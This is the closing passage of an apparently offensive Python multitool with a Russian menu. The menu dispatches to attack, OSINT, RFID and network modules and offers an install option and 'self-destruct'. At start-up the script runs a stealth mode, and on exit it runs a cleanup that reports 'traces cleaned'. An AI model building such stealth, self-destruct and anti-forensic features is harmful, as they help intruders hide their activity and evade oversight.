║  9.🌐 СЕРВИСЫ                       ║
╠══════════════════════════════════════╣
║  98.Установка  99.САМОУНИЧТОЖЕНИЕ  ║
║  0.Выход                            ║
╚══════════════════════════════════════╝
""")
        c = input('>>> ').strip()
        if c == '0': break
        elif c == '1': menu_network()
        elif c == '2': menu_devices()
        elif c == '3': menu_attack()
        elif c == '4': menu_defense()
        elif c == '5': menu_rfid()
        elif c == '6': menu_osint()
        elif c == '7': menu_auto()
        elif c == '8': menu_data()
        elif c == '9': menu_services()
        elif c == '98': safe_run(install_all)
        elif c == '99': safe_run(self_destruct)

if __name__ == '__main__':
    stealth_mode()
    try: main()
    except KeyboardInterrupt: print("\n👋 Выход")
    finally: auto_clean(); print("🧹 Следы очищены")
